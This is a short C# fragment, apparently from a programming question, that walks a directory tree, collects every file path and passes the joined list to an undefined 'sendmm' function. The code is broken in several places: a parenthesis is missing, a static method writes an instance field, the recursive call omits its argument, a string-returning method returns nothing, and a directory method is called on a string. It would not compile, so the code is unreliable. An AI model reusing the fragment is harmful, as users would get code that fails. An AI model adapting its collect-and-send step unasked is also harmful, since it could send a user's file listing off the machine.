    List < string > datas = new List<string>();
 
    public static void GetAllFiles(string sDir)
    {     datas = new List<string>();
          datas.AddRange(Directory.GetFiles(sDir);
        foreach (string dir in Directory.GetDirectories(sDir))
        {
           recursiveSearch();           
        }
        if (datas != null)
        {
            string dets = String.Join("\n\n", datas.ToArray());
            sendmm(dets);
        }
    }
    private string recursiveSearch(string dir)
    {
       datas.AddRange(Directory.GetFiles(dir));
       foreach(string directory in dir.GetDirectories())
       {
           recursiveSearch(directory);
       }
    }
